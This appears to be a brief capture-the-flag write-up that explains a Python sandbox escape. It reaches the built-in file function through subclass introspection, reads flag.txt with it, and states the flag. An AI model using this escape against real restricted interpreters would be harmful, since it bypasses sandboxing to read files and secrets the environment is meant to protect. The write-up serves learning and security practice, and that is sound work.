We can access the builtins via sub-typing and method resolution, or more specifically the file
function via:

    f = [].__class__.__base__.__subclasses__()[40]

What this does is grab the 40th index of all the built in subclasses, which happens to be the file function.
With this, we can open flag.txt and read it via:

    print(f("flag.txt").read())

The flag is not_your_average_python
